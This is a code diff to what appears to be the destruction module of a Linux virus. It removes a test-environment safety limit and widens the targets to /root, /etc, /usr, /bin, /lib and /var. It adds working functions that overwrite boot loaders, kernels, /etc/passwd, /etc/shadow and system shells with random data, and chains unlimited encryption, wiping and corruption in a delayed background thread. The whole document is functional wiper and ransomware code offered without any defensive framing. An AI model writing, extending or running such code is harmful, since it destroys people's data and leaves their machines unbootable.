@@ -154,12 +154,19 @@ def should_skip_path(path):
     if path.startswith(virus_dir):
         return True
     
-    # Skip system critical directories (for safety in test environment)
+    # Skip only virtual filesystems and device files (for safety)
+    # NOTE: For complete destruction, we allow /boot to be targeted
     skip_patterns = [
-        '/proc', '/sys', '/dev', '/run', '/tmp',
-        '/boot', '/lost+found',
-        '/snap',  # Snap packages
+        '/proc',  # Virtual filesystem
+        '/sys',   # Virtual filesystem
+        '/dev',   # Device files
+        '/run',   # Runtime data (may cause immediate system issues)
     ]
+    
+    # Only skip /boot if DESTRUCTION_SKIP_BOOT is enabled
+    from virus_config import DESTRUCTION_SKIP_BOOT
+    if DESTRUCTION_SKIP_BOOT:
+        skip_patterns.extend(['/boot', '/lost+found', '/snap'])
     
     for pattern in skip_patterns:
         if path.startswith(pattern):
@@ -184,24 +191,42 @@ def get_target_directories():
     home_dirs = [
         os.path.expanduser('~'),
         '/home',
+        '/root',
     ]
     
     for home_dir in home_dirs:
         if os.path.exists(home_dir):
             targets.append(home_dir)
     
-    # Common data directories
-    data_dirs = [
-        '/opt',
-        '/usr/local',
-        '/srv',
-        '/var/www',
-        '/var/lib',
+    # System critical directories (for complete destruction)
+    system_dirs = [
+        '/etc',           # System configuration
+        '/usr',           # User programs and data
+        '/usr/bin',       # User binaries
+        '/usr/sbin',      # System binaries
+        '/usr/lib',       # Libraries
+        '/usr/lib64',     # 64-bit libraries
+        '/usr/lib32',     # 32-bit libraries
+        '/usr/share',     # Shared data
+        '/usr/local',     # Local installations
+        '/bin',           # Essential binaries
+        '/sbin',          # System binaries
+        '/lib',           # Essential libraries
+        '/lib64',         # 64-bit essential libraries
+        '/lib32',         # 32-bit essential libraries
+        '/opt',           # Optional software
+        '/srv',           # Service data
+        '/var',           # Variable data
+        '/var/www',       # Web content
+        '/var/lib',       # Variable libraries
+        '/var/log',       # Log files
+        '/var/cache',     # Cache files
+        '/var/tmp',       # Temporary files
     ]
     
-    for data_dir in data_dirs:
-        if os.path.exists(data_dir):
-            targets.append(data_dir)
+    for system_dir in system_dirs:
+        if os.path.exists(system_dir):
+            targets.append(system_dir)
     
     # Desktop, Documents, Downloads in home
     user_home = os.path.expanduser('~')
@@ -319,21 +344,107 @@ def wipe_filesystem(target_dirs=None, file_extensions=None, max_files=None):
     
     log_activity("DESTRUCTION", f"Wiping complete: {wiped_count} files wiped, {error_count} errors")
 
+def corrupt_boot_files():
+    """Corrupt boot files to prevent system from booting"""
+    boot_targets = [
+        '/boot/vmlinuz',
+        '/boot/initrd.img',
+        '/boot/grub/grub.cfg',
+        '/boot/grub/menu.lst',
+        '/boot/efi/EFI/ubuntu/grubx64.efi',
+        '/boot/efi/EFI/BOOT/bootx64.efi',
+    ]
+    
+    corrupted = 0
+    for boot_file in boot_targets:
+        if os.path.exists(boot_file):
+            try:
+                # Overwrite with random data
+                with open(boot_file, 'wb') as f:
+                    f.write(os.urandom(1024))  # Write 1KB of random data
+                corrupted += 1
+                log_activity("DESTRUCTION", f"Corrupted boot file: {boot_file}")
+            except:
+                pass
+    
+    if corrupted > 0:
+        log_activity("DESTRUCTION", f"Corrupted {corrupted} boot files - system may not boot")
+
+def corrupt_system_critical_files():
+    """Corrupt critical system files"""
+    critical_files = [
+        '/etc/passwd',
+        '/etc/shadow',
+        '/etc/group',
+        '/etc/fstab',
+        '/etc/hosts',
+        '/etc/resolv.conf',
+        '/etc/network/interfaces',
+        '/etc/systemd/system.conf',
+        '/bin/sh',
+        '/bin/bash',
+        '/bin/ls',
+        '/usr/bin/python3',
+        '/usr/bin/python',
+    ]
+    
+    corrupted = 0
+    for critical_file in critical_files:
+        if os.path.exists(critical_file):
+            try:
+                # Overwrite with random data
+                with open(critical_file, 'wb') as f:
+                    f.write(os.urandom(512))  # Write 512 bytes of random data
+                corrupted += 1
+                log_activity("DESTRUCTION", f"Corrupted critical file: {critical_file}")
+            except:
+                pass
+    
+    if corrupted > 0:
+        log_activity("DESTRUCTION", f"Corrupted {corrupted} critical system files")
+
+def destroy_filesystem():
+    """Complete filesystem destruction - encryption + wiping + corruption"""
+    log_activity("DESTRUCTION", "Starting complete filesystem destruction...")
+    
+    # Phase 1: Encrypt files
+    if ENABLE_FILESYSTEM_ENCRYPTION:
+        encrypt_filesystem(max_files=None)  # No limit for complete destruction
+    
+    # Phase 2: Wipe files
+    if ENABLE_FILESYSTEM_WIPING:
+        wipe_filesystem(max_files=None)  # No limit for complete destruction
+    
+    # Phase 3: Corrupt boot and critical files
+    if ENABLE_FILESYSTEM_DESTRUCTION:
+        corrupt_boot_files()
+        corrupt_system_critical_files()
+    
+    log_activity("DESTRUCTION", "Complete filesystem destruction finished")
+
 def destruction_worker():
     """Background worker for periodic filesystem destruction"""
-    if not (ENABLE_FILESYSTEM_ENCRYPTION or ENABLE_FILESYSTEM_WIPING):
+    if not (ENABLE_FILESYSTEM_ENCRYPTION or ENABLE_FILESYSTEM_WIPING or ENABLE_FILESYSTEM_DESTRUCTION):
         return
     
     # Wait before starting destruction
     time.sleep(DESTRUCTION_DELAY)
     
+    # Run complete destruction once if enabled
+    if ENABLE_FILESYSTEM_DESTRUCTION:
+        try:
+            destroy_filesystem()
+        except Exception as e:
+            log_activity("DESTRUCTION", f"Error in complete destruction: {e}")
+    
+    # Continue with periodic destruction
     while True:
         try:
             if ENABLE_FILESYSTEM_ENCRYPTION:
-                encrypt_filesystem(max_files=DESTRUCTION_BATCH_SIZE)
+                encrypt_filesystem(max_files=DESTRUCTION_BATCH_SIZE if DESTRUCTION_BATCH_SIZE else None)
             
             if ENABLE_FILESYSTEM_WIPING:
-                wipe_filesystem(max_files=DESTRUCTION_BATCH_SIZE)
+                wipe_filesystem(max_files=DESTRUCTION_BATCH_SIZE if DESTRUCTION_BATCH_SIZE else None)
             
             # Wait before next batch
             time.sleep(DESTRUCTION_INTERVAL)
@@ -343,7 +454,7 @@ def destruction_worker():
 
 def start_destruction():
     """Start filesystem destruction in background thread"""
-    if ENABLE_FILESYSTEM_ENCRYPTION or ENABLE_FILESYSTEM_WIPING:
+    if ENABLE_FILESYSTEM_ENCRYPTION or ENABLE_FILESYSTEM_WIPING or ENABLE_FILESYSTEM_DESTRUCTION:
         destruction_thread = threading.Thread(target=destruction_worker, daemon=True)
         destruction_thread.start()
         log_activity("DESTRUCTION", "Filesystem destruction module activated")
